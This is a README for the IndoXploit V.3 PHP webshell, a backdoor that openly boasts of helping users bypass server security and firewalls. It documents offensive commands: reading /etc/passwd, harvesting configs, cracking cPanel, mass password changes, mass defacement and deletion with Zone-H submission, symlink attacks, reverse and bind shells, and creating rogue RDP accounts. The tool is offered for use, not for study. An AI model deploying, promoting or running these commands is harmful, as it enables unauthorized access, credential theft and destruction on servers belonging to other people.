# IndoXploit Webshell V.3
IndoXploit webshell V.3 is an PHP based webshell or backdoor with unique and usefull features. This webshell is originally coded by **agussetyar** from **IndoXploit Coders Team**. IndoXploit Shell has been mentioned repeatedly by the coder that it will make you easily bypass server security. With this shell you can comfortably bypass the server firewall from most secure servers. It is one of the hacker's most preferred backdoor shell.

# Features
- Mass Password Change
- Fake Root
- Cpanel Crack
- Mass Deface/Delete File
- Zone-H Mass Submit

# How to Use
 - Read File
 usage: rf [filename]
 example: rf /etc/passwd

 - Spawn File/Tools 
 usage: spawn [name]

 [name]
- Adminer (adminer)
 - WebConsole (webconsole)
 - CGI Telnet 1 (cgitelnet1)
 - CGI Telnet 2 (cgitelnet2)
 - PHPINFO (phpinfo)

 example:
 spawn adminer
 spawn webconsole
 spawn cgitelnet1

- Jumping
usage: jumping

- Config Grabber
usage: idxconfig

 - Symlink 
 usage: symlink

 - Reverse Shell 
 [Back Connect]
 usage: rvr bc [IP] [PORT] [TYPE]
 example:
 ~~~
 rvr bc 127.0.0.1 1337 bash
 rvr bc 127.0.0.1 1337 perl
~~~

 [Bind Port]
 usage: rvr bp [PORT] [TYPE]
 example:
~~
 rvr bp 1337 perl
~~

 - KRDP - Create RDP Account (for windows server only) 
 usage: krdp

 - Logout From Shell
usage: logout

 - Kill Backdoor 
usage: killme
